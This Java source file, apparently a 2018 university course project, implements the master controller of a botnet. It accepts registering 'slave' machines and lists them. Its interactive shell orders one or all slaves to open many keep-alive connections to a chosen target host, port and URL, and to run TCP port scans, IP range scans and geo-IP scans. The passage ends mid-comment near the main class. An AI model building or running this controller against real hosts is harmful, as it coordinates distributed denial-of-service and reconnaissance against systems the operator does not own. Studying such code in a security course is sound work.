//File Name: MasterBot.java
//Author: Vivek Maran
//Email Address: vivek.maran@sjsu.edu
//Programming project: 
//Last Changed: Mar 3, 2018

/*************************** HEADERS ******************************************/
import java.io.*;

import java.util.ArrayList;
import java.util.Queue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import java.util.concurrent.Future;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Set;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

/*************************** TYPES *******************************************/
enum Status {
    SUCCESS, FAILURE, TIMEOUT
};

/*************************** CLASS DEFINITIONS *******************************/

/**
 * This class represents a connected slave and provides accessor methods to
 * access the information of the connected slave. Following are the list of
 * information that is maintained about the slave
 * <ul>
 * <li> Host name </li>
 * <li> IP address </li>
 * <li> Port number </li>
 * <li> Date at which the slave registered with master</li>
 * </ul>
 */
class Slave
{   
    /**
     * @brief Instantiates the slave.
     */
    public Slave()
    {
        m_hostName = "UNRESOLVED";
    }
    /**
     * @brief Gets the registration time of this slave
     * @return Registration time in {@link LocalDateTime} format
     */
    public LocalDateTime getM_regTime() {
        return m_regTime;
    }

    /**
     * @brief Sets the registration time for this slave.
     * @param a_regTime Registration time in {@link LocalDateTime} format
     */
    public void setM_registrationTime(LocalDateTime a_regTime) {
        this.m_regTime = a_regTime;
    }

    /**
     * @brief Gets the host name of this slave
     * @return Host name
     */
    public String getM_HostName() {
        return m_hostName;
    }

    /**
     * @brief Sets the host name of this slave
     * @param a_hostName - Host name to be set
     */
    public void setM_HostName(String a_hostName) {
        this.m_hostName = a_hostName;
    }
    /**
     * @brief Gets the IP address of this slave
     * @return IP address
     */
    public String getM_IpAddress() {
        return m_ipAddrStr;
    }

    /**
     * @brief Sets the IP address of this slave
     * @param a_IpAddress - IP address to set
     */
    public void setM_IpAddress(String a_IpAddress) {
        this.m_ipAddrStr = a_IpAddress;
    }

    /**
     * @brief Gets the port of this slave
     * @return Port number
     */
    public int getM_Port() {
        return m_Port;
    }

    /**
     * @brief Sets the port of this slave
     * m_Port - Port to set
     */
    public void setM_Port(int a_Port) {
        this.m_Port = a_Port;
    }
    
    /** Host name */
    private String m_hostName;

    /** IP address string */
    private String m_ipAddrStr;
    
    /** Port number */
    private int m_Port;

    /** Registration time */
    private LocalDateTime m_regTime;
    
}
/**
 * This class represents a Slave connection. Each slave connection is associated
 * with a socket channel, receive buffer, and message builder 
 */
class SlaveConn
{
    /** Receive buffer size */
    public static final int READ_BUFFER_SIZE = 1024;
    
    /** Slave connection constructor */
    public SlaveConn()
    {
        m_messageBuilder = new StringBuilder();
        m_readBuffer = ByteBuffer.allocateDirect(READ_BUFFER_SIZE);
    }
    
    /** Connections managed */
    private SocketChannel m_socketChannel;

    /** Message string builder */
    private StringBuilder m_messageBuilder;
    
    /** Read buffer */
    private ByteBuffer m_readBuffer;

    /** Registration time */
    private LocalDateTime m_registrationTime;
    
    
    public LocalDateTime getM_registrationTime() {
        return m_registrationTime;
    }

    public void setM_registrationTime(LocalDateTime a_RegistrationTime) {
        this.m_registrationTime = a_RegistrationTime;
    }

    public SocketChannel getM_Channel() {
        return m_socketChannel;
    }
    
    public void setM_Channel(SocketChannel a_socketChannel) {
        this.m_socketChannel = a_socketChannel;
    }

    public StringBuilder getM_MessageBuilder() {
        return m_messageBuilder;
    }

    public void setM_MessageBuilder(StringBuilder a_messageBuilder) {
        this.m_messageBuilder = a_messageBuilder;
    }

    public void clearMessageBuilder() {
        this.m_messageBuilder.setLength(0);;
    }

    public void clearReadBuffer() {
        this.m_readBuffer.clear();
    }

    public ByteBuffer getM_ReadBuffer() {
        return m_readBuffer;
    }

    public void setM_ReadBuffer(ByteBuffer a_readBuffer) {
        this.m_readBuffer = a_readBuffer;
    }
}

/**
 * The purpose of this class is to manage slave connections. The class does the
 * following
 * <ul>
 * <li>Asynchronous listen on the configure port</li>
 * <li>Send network commands to the slave</li>
 * <li>Manages the slave list</li>
 * </ul>
 */
class ConnHandler extends TimerTask
{

    /** Interval at which new connections has to be polled */
    static final Integer CONNECTION_POLL_INVL_MS = 100;
     
    /** Registration string from client */
    static final String REGISTRATION_MSG = "REGISTER" + "\n";
    
    /**
     * Constructor for the ConnHandler class. It does the following: creates
     * a single threaded pool to process requests from InputHandler and listen 
     * for incoming connections; creates a timer to poll for incoming connections
     * asynchronously; creates arraylist to manage the slaves
     * @throws Exception
     */   
    public ConnHandler(Queue<String> a_resultQueue)
    {
        m_executor = Executors.newSingleThreadExecutor();
        m_connPollTmr = new Timer();
        m_slaveConns = new ArrayList<SlaveConn>();
        m_resultQueue = a_resultQueue;
    }
    
    
    /**
     * API to configure the listen port for this connection handler.
     * @throws Exception
     */   
    public void setPort(Integer a_ListenPort) { m_listenPort = a_ListenPort;}
    
    
    /**
     * API to submit start request to the connection handler thread.
     * This API is synchronous,successful. The processing of start involves
     * opening a non-blocking server socket channel, which is bound to a
     * configured port,the wildcard address. Upon completion of this
     * API' the {@link ConnHandler} is ready to accept connections from the
     * slave, 
     * @return {@link Status} 
     */   
    public Status start() {

        Status ApiStatus = Status.FAILURE;
        // System.out.println("Thread # " + Thread.currentThread().getId()
        // + " Submitting start request to controller");
        Future<Status> future = m_executor.submit(() -> {
            Status ExecStatus = Status.FAILURE;
            // long threadId = Thread.currentThread().getId();
            // System.out.println("Thread # " + threadId + " Starting
            // controller");

            try {
                // InetAddress hostIPAddress =
                // InetAddress.getByName("localhost");
                m_channel = ServerSocketChannel.open();
                m_selector = Selector.open();
                m_channel.configureBlocking(false);
                m_channel.socket().bind(new InetSocketAddress(m_listenPort));
                m_channel.register(m_selector, SelectionKey.OP_ACCEPT);
                m_connPollTmr.scheduleAtFixedRate(this, 0,
                        CONNECTION_POLL_INVL_MS);
                ExecStatus = Status.SUCCESS;
            } catch (IOException e) {
                System.err.println(
                        "Error opening server soceket" + e.getMessage());
                ExecStatus = Status.FAILURE;
            }
            return ExecStatus;
        });

        try {
            ApiStatus = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);

        } catch (Exception e) {
            System.err.println(
                    "Exception in ConnHandler::start" + e.getMessage());
            ApiStatus = Status.FAILURE;
        }
        return ApiStatus;
    }

    /**
     * API invoked by the TimerTask every
     * {@link ConnHandler.CONNECTION_POLL_INVL_MS} during which the listen socket
     * is polled for new connections from the slave.
     * @Override of {@link TimerTask}
     */   
    public void run() {
        m_executor.submit(() -> {
            try {
                if (m_selector.selectNow() > 0) {
                    onSockChannelSelect(m_selector.selectedKeys());
                    m_selector.selectedKeys().clear();
                }
            } catch (IOException e) {
                System.err.println(
                        "Exception in polling connections" + e.getMessage());
            }
        });
    }

    /**
     * Loops through the list of {@link:SlaveConn}, uses the
     * {@link: SocketChannel} present in the same to retrieve the information
     * about the connected slave and cretes a list of {@link Slave} which is
     * returned to the caller
     * 
     * @return ArrayList<Slave>
     */
    public ArrayList<Slave> getSlaveList() {
        ArrayList<Slave> SlaveListRet = new ArrayList<Slave>();
//        System.out.println("Thread # " + Thread.currentThread().getId()
//                + " Submitting getSlaveList request to controller");
        Future<ArrayList<Slave>> future = m_executor.submit(() -> {
            ArrayList<Slave> CurrSlaveList = new ArrayList<Slave>();
//            long threadId = Thread.currentThread().getId();
//            System.out.println(
//                    "Thread # " + threadId + " Processing getSlaveList");
            for (SlaveConn slaveConn : m_slaveConns) {
                try {
                    Slave slaveNode = new Slave();
                    SocketChannel ss = slaveConn.getM_Channel();
                    slaveNode.setM_IpAddress(
                            ss.socket().getInetAddress().getHostAddress());
                    slaveNode.setM_HostName(ss.socket().getInetAddress()
                            .getCanonicalHostName());
                    slaveNode.setM_Port((ss.socket().getPort()));
                    slaveNode.setM_registrationTime(
                            slaveConn.getM_registrationTime());
                    CurrSlaveList.add(slaveNode);
                } catch (Exception e) {
                    System.err.println("Error getting info from slavenode"
                            + e.getMessage());
                }
            }
            return CurrSlaveList;
        });

        try {
            SlaveListRet = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("Error opening server socket" + e.getMessage());
        }
        return SlaveListRet;
    }
    
    /**
     * Loops through the list of {@link:SlaveConn}, uses the
     * {@link: SocketChannel} present in the same to retrieve the address and
     * compares it agins the slave address passed by the user. If there is a
     * match (or) if the slaveaddress is "all", then connect command is sent to
     * those slave(s). *
     * 
     * @return ArrayList<Slave>
     */
    public Status connectSlaveToTarget(String a_slaveHost, String a_targetHost,
            Integer a_targetPort, Integer a_numConnectionsTotarget, Boolean a_keepalive, String a_url) {
        Status apiStatus = Status.FAILURE;
        // System.out.println("Thread # " + Thread.currentThread().getId()
        // + " Submitting connectSlaveToTarget request to controller");
        Boolean isAllSlaves = a_slaveHost.equalsIgnoreCase("all");
        Future<Status> future = m_executor.submit(() -> {
            Status execStatus = Status.SUCCESS;
            for (SlaveConn slaveConnection : m_slaveConns) {
                try {
                    Boolean isInterstedSlave = false;
                    // Get slave to command from list of slaves.
                    if (isAllSlaves) {
                        isInterstedSlave = true;
                    } else {
                        String slaveNodeAddr = slaveConnection.getM_Channel()
                                .socket().getInetAddress().getHostAddress();
                        String destinedSlaveAddr = InetAddress
                                .getByName(a_slaveHost).getHostAddress();
                        if (slaveNodeAddr.equals(destinedSlaveAddr)) {
                            isInterstedSlave = true;
                        }
                    }
//                    System.out.print(isInterstedSlave);
                    if (isInterstedSlave) {
                        SocketChannel slaveSockChannel = slaveConnection
                                .getM_Channel();
                        String Command = "connect" + " " + a_targetHost + " "
                                + a_targetPort + " " + a_numConnectionsTotarget
                                + " " + a_keepalive;
                        if(!a_url.isEmpty())
                        {
                            Command += " "+a_url; 
                        }
                        Command +="\n";
//                        System.out.print(Command);
                        ByteBuffer buf = ByteBuffer.allocate(1024);
                        buf.clear();
                        buf.put(Command.getBytes());
                        buf.flip();
                        while (buf.hasRemaining()) {
                            slaveSockChannel.write(buf);
                        }
                        //break;
                    }
                } catch (Exception e) {
                    System.err.println("Error processing connectSlaveToTarget"
                            + e.getMessage());
                    execStatus = Status.FAILURE;
                }
            }
            return execStatus;
        });
        try {
            apiStatus = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println(
                    "connectSlaveToTarget returned error" + e.getMessage());
        }
        return apiStatus;
    }
    
    /**
     * Loops through the list of {@link:SlaveConn}, uses the
     * {@link: SocketChannel} present in the same to retrieve the address and
     * compares it agins the slave address passed by the user. If there is a
     * match (or) then disconnect command is sent to those slave(s).
     */
    public Status disconnectSlaveFromTarget(String a_slaveHost,
            String a_targetHost, Integer a_targetPort) {
        Status apiStatus = Status.FAILURE;
//        System.out.println("Thread # " + Thread.currentThread().getId()
//                + " Submitting disconnectSlaveFromTarget request to controller");
        Boolean isAllSlaves = a_slaveHost.equalsIgnoreCase("all");
        Future<Status> future = m_executor.submit(() -> {
            Status execStatus = Status.SUCCESS;
            for (SlaveConn slaveConnection : m_slaveConns) {
                try {
                    Boolean isInterstedSlave = false;
                    if (isAllSlaves) {
                        isInterstedSlave = true;
                    } else {
                        String slaveNodeAddr = slaveConnection.getM_Channel()
                                .socket().getInetAddress().getHostAddress();
                        String destinedSlaveAddr = InetAddress
                                .getByName(a_slaveHost).getHostAddress();
                        if (slaveNodeAddr.equals(destinedSlaveAddr)) {
                            isInterstedSlave = true;
                        }
                    }

                    if (isInterstedSlave) {
                        SocketChannel slaveSockChannel = slaveConnection
                                .getM_Channel();
                        String Command = "disconnect" + " " + a_targetHost + " "
                                + a_targetPort + " " + "\n";
                        ByteBuffer buf = ByteBuffer.allocate(1024);
                        buf.clear();
                        buf.put(Command.getBytes());
                        buf.flip();
                        while (buf.hasRemaining()) {
                            slaveSockChannel.write(buf);
                        }
                        //break;
                    }
                } catch (Exception e) {
                    System.err.println(
                            "Error processing disconnectSlaveFromTarget"
                                    + e.getMessage());
                    execStatus = Status.FAILURE;
                }
            }
            return execStatus;
        });
        try {
            apiStatus = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("disconnectSlaveFromTarget returned error"
                    + e.getMessage());
        }
        return apiStatus;
    }

    /**
     * Loops through the list of {@link:SlaveConn}, uses the
     * {@link: SocketChannel} present in the same to retrieve the address and
     * compares it agins the slave address passed by the user. If there is a
     * match (or) then tcpportscan command is sent to those slave(s).
     */
    public Status scanPortsinTarget(String a_slaveHost,
            String a_targetHost, String a_portRange) {
        Status apiStatus = Status.FAILURE;
//        System.out.println("Thread # " + Thread.currentThread().getId()
//                + " Submitting disconnectSlaveFromTarget request to controller");
        Boolean isAllSlaves = a_slaveHost.equalsIgnoreCase("all");
        Future<Status> future = m_executor.submit(() -> {
            Status execStatus = Status.SUCCESS;
            for (SlaveConn slaveConnection : m_slaveConns) {
                try {
                    Boolean isInterstedSlave = false;
                    if (isAllSlaves) {
                        isInterstedSlave = true;
                    } else {
                        String slaveNodeAddr = slaveConnection.getM_Channel()
                                .socket().getInetAddress().getHostAddress();
                        String destinedSlaveAddr = InetAddress
                                .getByName(a_slaveHost).getHostAddress();
                        if (slaveNodeAddr.equals(destinedSlaveAddr)) {
                            isInterstedSlave = true;
                        }
                    }

                    if (isInterstedSlave) {
                        SocketChannel slaveSockChannel = slaveConnection
                                .getM_Channel();
                        String Command = "tcpportscan" + " " + a_targetHost + " "
                                + a_portRange + " " + "\n";
                        ByteBuffer buf = ByteBuffer.allocate(1024);
                        buf.clear();
                        buf.put(Command.getBytes());
                        buf.flip();
                        while (buf.hasRemaining()) {
                            slaveSockChannel.write(buf);
                        }
                        //break;
                    }
                } catch (Exception e) {
                    System.err.println(
                            "Error processing scanPortsinTarget"
                                    + e.getMessage());
                    execStatus = Status.FAILURE;
                }
            }
            return execStatus;
        });
        try {
            apiStatus = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("scanPortsinTarget returned error"
                    + e.getMessage());
        }
        return apiStatus;
    }
    /**
     * Loops through the list of {@link:SlaveConn}, uses the
     * {@link: SocketChannel} present in the same to retrieve the address and
     * compares it agins the slave address passed by the user. If there is a
     * match (or) then ipscan command is sent to those slave(s).
     */
    public Status ipScan(String a_slaveHost, String a_ipRange, Boolean IsGeoEnabled) {
        Status apiStatus = Status.FAILURE;
        // System.out.println("Thread # " + Thread.currentThread().getId()
        // + " Submitting disconnectSlaveFromTarget request to controller");
        Boolean isAllSlaves = a_slaveHost.equalsIgnoreCase("all");
        Future<Status> future = m_executor.submit(() -> {
            Status execStatus = Status.SUCCESS;
            for (SlaveConn slaveConnection : m_slaveConns) {
                try {
                    Boolean isInterstedSlave = false;
                    if (isAllSlaves) {
                        isInterstedSlave = true;
                    } else {
                        String slaveNodeAddr = slaveConnection.getM_Channel()
                                .socket().getInetAddress().getHostAddress();
                        String destinedSlaveAddr = InetAddress
                                .getByName(a_slaveHost).getHostAddress();
                        if (slaveNodeAddr.equals(destinedSlaveAddr)) {
                            isInterstedSlave = true;
                        }
                    }

                    if (isInterstedSlave) {
                        SocketChannel slaveSockChannel = slaveConnection
                                .getM_Channel();
                        String baseCommand;
                        if (IsGeoEnabled) {
                            baseCommand = "geoipscan";
                        } else {
                            baseCommand = "ipscan";
                        }
                        String Command = baseCommand + " " + a_ipRange + " "
                                + "\n";
                        ByteBuffer buf = ByteBuffer.allocate(1024);
                        buf.clear();
                        buf.put(Command.getBytes());
                        buf.flip();
                        while (buf.hasRemaining()) {
                            slaveSockChannel.write(buf);
                        }
                        // break;
                    }
                } catch (Exception e) {
                    System.err.println(
                            "Error processing ipScan" + e.getMessage());
                    execStatus = Status.FAILURE;
                }
            }
            return execStatus;
        });
        try {
            apiStatus = future.get(MasterBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println(
                    "scanPortsinTarget returned error" + e.getMessage());
        }
        return apiStatus;
    }    

    /**
     * Handler for socketchannel select. Upon accept,a bew SlaveConn instance
     * is created with a acccepted socketchannel and added to the array of slaves.
     * Upon read, if registration message is received, the registration time
     * is saved in the respective SlaveConn. If there is a exception in read
     * (or) if it returned -1, close the socket and remove the SlaveConn
     * @return {@link Status} 
     * @throws Exception
     */   
    private void onSockChannelSelect(Set<SelectionKey> ReadySet) {
        for (SelectionKey key : ReadySet) {
            if (key.isAcceptable()) {
                try {
                    SlaveConn newSlaveConn = new SlaveConn();
                    ServerSocketChannel ssChannel = (ServerSocketChannel) key
                            .channel();
                    SocketChannel sChannel = (SocketChannel) ssChannel.accept();
                    sChannel.configureBlocking(false);
                    sChannel.register(key.selector(), SelectionKey.OP_READ,
                            newSlaveConn.getM_MessageBuilder());
                    newSlaveConn.setM_Channel(sChannel);
//                    System.out.println(
//                            "Thread # " + Thread.currentThread().getId()
//                                    + " Accepted new connection");
                    m_slaveConns.add(newSlaveConn);
                } catch (Exception e) {
                    System.err.println(
                            "Error accepting connection" + e.getMessage());
                }
            }
            else if (key.isReadable()) {
                try {
                    // List of closed connections
                    ArrayList<SlaveConn> closedConns;
                    closedConns = new ArrayList<SlaveConn>();

                    SocketChannel sChannel = (SocketChannel) key.channel();

//                    System.err.println("Thread # "
//                            + Thread.currentThread().getId()
//                            + " Something received for read");

                    // Iterate through list of channels
                    for (SlaveConn slaveConn : m_slaveConns) {

                        // Find matching channel
                        if (slaveConn.getM_Channel() == sChannel) {
                            int readCount = 0;
                            try {
                                slaveConn.clearReadBuffer();
                                readCount = sChannel
                                        .read(slaveConn.getM_ReadBuffer());
//                                System.out.println(
//                                        "\nData read: " +slaveConn.getM_ReadBuffer().remaining()+ " "+ readCount);
                                // Read message from channel
                                if (readCount > 0) {
                                    slaveConn.getM_ReadBuffer().flip();
//                                    System.out.println(
//                                            "Rem after flip: " +slaveConn.getM_ReadBuffer().remaining());
                                    byte[] subStringBytes = new byte[readCount];
                                    slaveConn.getM_ReadBuffer()
                                            .get(subStringBytes);
                                    slaveConn.getM_MessageBuilder()
                                            .append(new String(subStringBytes));
//                                    System.out.print(slaveConn
//                                            .getM_MessageBuilder().toString());
                                    // Store registration time
                                    if (slaveConn.getM_MessageBuilder()
                                            .toString()
                                            .equals(REGISTRATION_MSG)) {
                                        slaveConn.setM_registrationTime(
                                                LocalDateTime.now());
                                        slaveConn.clearMessageBuilder();
                                    } else if (slaveConn.getM_MessageBuilder()
                                            .toString().endsWith("\n")) {
                                        String slaveMsg = slaveConn
                                                .getM_MessageBuilder()
                                                .toString();
                                        m_resultQueue.offer(slaveMsg.substring(
                                                0, slaveMsg.length() - 1));
                                        InputHandler.InterruptRead  = true;
                                        slaveConn.clearMessageBuilder();
                                    }
                                } else {// Connection closed //
                                    if(readCount == -1)
                                    {
//                                        System.err.println("Thread # "
//                                                + Thread.currentThread().getId()
//                                                + " Connection closed by slave "
//                                                + readCount);
                                        sChannel.close();
                                        closedConns.add(slaveConn);
                                    }
                                }
                            } catch (Exception e) {
                                System.err.println("Thread # "
                                        + Thread.currentThread().getId()
                                        + " Closing slave connection");
                                sChannel.close();
                                closedConns.add(slaveConn);
                            }
                        }
                    }
                    m_slaveConns.removeAll(closedConns);
                } catch (Exception e) {
                    System.err.println(
                            "Error accepting connection" + e.getMessage());
                    e.printStackTrace();
                }
            }
        }
    }
    
    /** Listen port */
    private Integer m_listenPort;
     
    /** Executor */
    private ExecutorService m_executor;
    
    /** Selector for the channel */
    private Selector m_selector;
    
    /** Server socket channel */
    private ServerSocketChannel m_channel;  
    
    /** Timer to poll for connections */
    private Timer m_connPollTmr;
    
    /** Slave connections */
    private ArrayList<SlaveConn> m_slaveConns;

    /** Result queue */
    Queue<String> m_resultQueue;
}

/**
 * The purpose of this class is to parse command line arguments from the
 * user to configure the {@link ConnHandler}, and provide an run time shell
 * based CLI interface to control the {@link MasterBot}.
 * <ul>
 *      <li>list - lists the connected slaves</li>
 *      <li>connect - Commands the slave to connect to a target host</li>
 *      <li>disconnect - Commands the slave to disconnect from the target 
 *      host</li>
 * </ul>
 */
class InputHandler
{
    /** Number of arguments for the connect command */
    public static final int NUM_ARGS_CONNECT = 3;

    /** Number of arguments for the diconnect command */
    public static final int NUM_ARGS_DISCONNECT = 2;
    
    /** Number of arguments for program launch */
    private static final int NUM_ARGS_PROGRAM_LAUNCH = 2;

    /** Number of arguments for the tcpportscan command */
    private static final int NUM_ARGS_TCP_PORT_SCAN = 3;

    /** Number of arguments for the ipscan command */
    private static final int NUM_ARGS_IP_SCAN = 2;

    /** Token used to identfiy 'keys' in the argument */
    private static final char TOKEN_FOR_ARG_KEY = '-';

    /** Key name for the port argument */
    private static final char ARG_PORT_NUM = 'p';

    /** Prompt character for  the shell */
    private static final char SHELL_PROMPT = '>';

    /** 'list' command */
    private static final String LIST_CMD = "list";

    /** 'connect' command  */
    private static final String CONNECT_CMD = "connect";

    /** 'disconnect' command */
    private static final String DISCONNECT_CMD = "disconnect";

    /** 'tcpportscan' command */
    private static final String TCP_PORT_SCAN = "tcpportscan";

    /** 'ipscan' command */
    private static final String IP_SCAN = "ipscan";

    /** 'ipscan' command */
    private static final String GEO_IP_SCAN = "geoipscan";

    /** 'keepalive', optional argument for connect command */
    private static final String OPT_CONNECT_ARG_KEEP_ALIVE = "keepalive";

    /** 'url=', optional argument for connect command */
    private static final String OPT_CONNECT_ARG_URL = "url=";

    /** Interrupt read */
    public static Boolean InterruptRead = false;
    
    /**
     * Constructor for the InputHandler class
     * @param args Command line arguments received from the user.
     * @param a_connHandler Connection handler interface for this input handler.
     * @throws Exception
     */
    public InputHandler(String[] args, ConnHandler a_connHandler,
            Queue<String> a_resultQueue) {
        try {
            m_connHandler = a_connHandler;
            m_resultQueue = a_resultQueue;
            configureConnHandler(args);
        } catch (Exception e) {
            throw (e);
        }
    }

    /**
     * Starts the controller. The controller starts the processor, and listens
     * for inputs from the user.
     */
    public void start()
    {
        m_connHandler.start();
        launchShell();
    }
    
    /**
     * Configures the connection handler based on the command line arguments
     * received from the user.
     * @param args Command line arguments received from the user.
     * @param a_connHandler Connection handler to configure.
     * @throws Exception
     */
    private void configureConnHandler(String[] args) {

        if (args.length == NUM_ARGS_PROGRAM_LAUNCH) {
            for (int i = 0; i < (args.length - 1); i++) {
                try {
                    int argKeyTokenIdx = args[i].indexOf(TOKEN_FOR_ARG_KEY);
                    if (-1 != argKeyTokenIdx) {
                        char key = args[i].charAt(argKeyTokenIdx + 1);
                        switch (key) {
                        case ARG_PORT_NUM: {
                            String port = args[i + 1];
                            Integer portNum = Integer.parseInt(port);
                            m_connHandler.setPort(portNum);
                            break;
                        }
                        default: {
                            throw new IllegalArgumentException(
                                    "Invalid option" + key);
                        }

                        }
                    } else {
                        /* Loop through */
                    }
                } catch (IndexOutOfBoundsException e) {
                    System.err.println(
                            "IndexOutOfBoundsException: " + e.getMessage());
                } catch (IllegalArgumentException e) {
                    System.err.println(
                            "IllegalArgumentException: " + e.getMessage());
                }
            }
        }
        else
        {
            throw new IllegalArgumentException(
                    "Wrong number of arguments passed");
        }
    }

    /**
     * Launches a shell based CLI to receive inputs from the user for 
     * controlling the MasterBot
     */
    private void launchShell() {
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(System.in));
        while (true) {
            try {
                

                /* Print any pending messages from conn handler */
                String msg = m_resultQueue.poll();
                if(msg != null)
                {
                    System.out.println(msg);
                }

                System.out.print(SHELL_PROMPT);
                
                Pattern line = Pattern.compile("^(.*)\\R");
                Matcher matcher;
                StringBuilder commandBuilder = new StringBuilder();
                String cmdLine;
                int chr = -1;
                do {
                    InterruptRead = false;
                    if (reader.ready())
                        chr = reader.read();
                    if (chr > -1)
                        commandBuilder.append((char) chr);
                    matcher = line.matcher(commandBuilder.toString());
                } while (!InterruptRead && !matcher.matches());

                if(InterruptRead)
                {
                    continue;
                }
                else
                {
                    cmdLine = matcher.matches() ? matcher.group(1) : "";
                }
                
                String[] cmdTokens = cmdLine.split("\\s+");
                if (cmdTokens[0].isEmpty()) {
                    continue;
                }
//                System.out.println(cmdTokens[0]);
                switch(cmdTokens[0])
                {
                case LIST_CMD: {
                    ArrayList<Slave> slaveList = m_connHandler.getSlaveList();
                    DateTimeFormatter dtf = DateTimeFormatter
                            .ofPattern("YYYY-MM-dd");
                    for (Slave SlaveNode : slaveList) {
                        System.out.println(SlaveNode.getM_HostName() + " "
                                + SlaveNode.getM_IpAddress() + " "
                                + SlaveNode.getM_Port() + " " + dtf.format(
                                        SlaveNode.getM_regTime()));
                    }
                    break;
                }
                case CONNECT_CMD: {
                    if ((cmdTokens.length - 1) >= NUM_ARGS_CONNECT) {
                        String slaveHost = cmdTokens[1];
                        String targetHost = cmdTokens[2];
                        Integer targetPort = Integer
                                .parseInt(cmdTokens[3]);
                        Integer numTargetConnections = 1;
                        Integer additionalArgIdx = 1;
                        Boolean keepAlive = false;
                        String url="";
                        if ((cmdTokens.length - 1) > NUM_ARGS_CONNECT) {
                            Integer numAdditionalArgs = (cmdTokens.length - 1)
                                    - NUM_ARGS_CONNECT;
                            while (numAdditionalArgs > 0) {
                                String optionalArg = cmdTokens[NUM_ARGS_CONNECT
                                        + additionalArgIdx];

                                --numAdditionalArgs;
                                ++additionalArgIdx;

                                // Check the optional arg
                                if (optionalArg.toLowerCase()
                                        .contains(OPT_CONNECT_ARG_KEEP_ALIVE
                                                .toLowerCase())) {
//                                    System.out.println("Setting keepalive");
                                    keepAlive = true;
                                    continue;
                                } else if (optionalArg.toLowerCase().contains(
                                        OPT_CONNECT_ARG_URL.toLowerCase())) {
                                    url = optionalArg.substring(
                                            optionalArg.indexOf("=") + 1);
//                                    System.out.println("Setting url: " + url);
                                    continue;
                                } else {
                                    try {
                                        numTargetConnections = Integer
                                                .parseInt(optionalArg);
//                                        System.out.println(
//                                                "Setting numTargetConnections: "
//                                                        + numTargetConnections);
                                    } catch (Exception e) {
                                        System.out.println(e.toString());
                                    }
                                }
                            }
                        }
                        Status ApiStatus = m_connHandler.connectSlaveToTarget(
                                slaveHost, targetHost, targetPort,
                                numTargetConnections,keepAlive, url);
                        if (ApiStatus != Status.SUCCESS) {
                             System.err.println("connectSlaveToTarget failed");
                        }
                    } else {
                        System.err.println("Invalid syntax for connect");
                    }
                    break;
                }
                case DISCONNECT_CMD: {
                    if ((cmdTokens.length - 1) >= NUM_ARGS_DISCONNECT) {
                        String slaveHost = cmdTokens[1];
                        String targetHost = cmdTokens[2];
                        Integer targetPort = -1;
                        if ((cmdTokens.length
                                - 1) > NUM_ARGS_DISCONNECT) {
                            targetPort = Integer.parseInt(cmdTokens[3]);
                        }
                        Status ApiStatus = m_connHandler
                                .disconnectSlaveFromTarget(slaveHost,
                                        targetHost, targetPort);
                        if (ApiStatus != Status.SUCCESS) {
                            System.err.println(
                                    "disconnectSlaveFromTarget failed");
                        }

                    } else {
                        System.err.println("Invalid syntax for disconnect");
                    }
                    break;
                }
                case TCP_PORT_SCAN:
                {
                    if ((cmdTokens.length - 1) == NUM_ARGS_TCP_PORT_SCAN) {
                        String slaveHost = cmdTokens[1];
                        String targetHost = cmdTokens[2];
                        String portRange = cmdTokens[3];

                        Status ApiStatus = m_connHandler.scanPortsinTarget(
                                slaveHost, targetHost, portRange);
                        if (ApiStatus != Status.SUCCESS) {
                            System.err.println("scanPortsinTarget failed");
                        }
                    } else {
                        System.err.println("Invalid syntax for tcpportscan");
                    }
                    break;
                    
                }
                case GEO_IP_SCAN:
                case IP_SCAN:
                {
                    if ((cmdTokens.length - 1) == NUM_ARGS_IP_SCAN) {
                        String slaveHost = cmdTokens[1];
                        String ipRange = cmdTokens[2];
                        Boolean IsGeoEnabled = false;
                        if(cmdTokens[0].equals(GEO_IP_SCAN))
                        {
                            IsGeoEnabled = true;
                        }
                        Status ApiStatus = m_connHandler.ipScan(slaveHost,
                                ipRange,IsGeoEnabled);
                        if (ApiStatus != Status.SUCCESS) {
                            System.err.println("ipScan failed");
                        }
                    } else {
                        System.err.println("Invalid syntax for ipscan");
                    }
                    break;
                }
                default: {
                    System.err.println("Command " + cmdTokens[0]
                            + " not supported");
                    break;
                }
                }
                
            } catch (Exception e) {
                System.err.println("Exception in processing user commmand "
                        + e.getMessage());
            }
        }
    }
    
    /** Connection handler interface for this input handler */
    private ConnHandler m_connHandler;

    /** Result queue */
    private Queue<String> m_resultQueue;
}

/**
 * MasterBot application class. The purpose of this class is to receive
 * command line input from the user, and controls the slaves connected to
 * this MasterBot. It also supports commands to query the MasterBot's 
 * information. The following are the list of commands supported.
 * <ul>
 *      <li>list - lists the connected slaves</li>
 *      <li>connect - Commands the slave to connect to a target host</li>
 *      <li>disconnect - Commands the slave to disconnect from the target 
 *      host</li>
 * </ul>
 */
public class MasterBot {

    /** The Constant: Time out value for synchronous API's. */
    static final Integer API_TIMEOUT_SECS = 60;
    
    /** Status code returned by this process. */
    static final Integer FAILURE = -1;

            
    /**
     * Entry point for the MasterBot application. Creates an MasterBot instance
     * and starts the same.If there is an exception in the construction (or)
     * in the 'start', the program exits with  {@link MasterBot#FAILURE}
     * @param args command line arguments received.
     */
    public static void main(String[] args) {

        try {
            MasterBot masterBotInst = new MasterBot(args);
            masterBotInst.start();
        } catch (Exception e) {
            System.out.println(e.getMessage() + " exiting");
            System.exit(FAILURE);
        }
    }

    /**
     * Instantiates a new master bot. The process involves: creating an
     * {@link ConnHandler}, which is responsible for managing the slave 
     * connections,and an {@link InputHandler}, which is responsible for
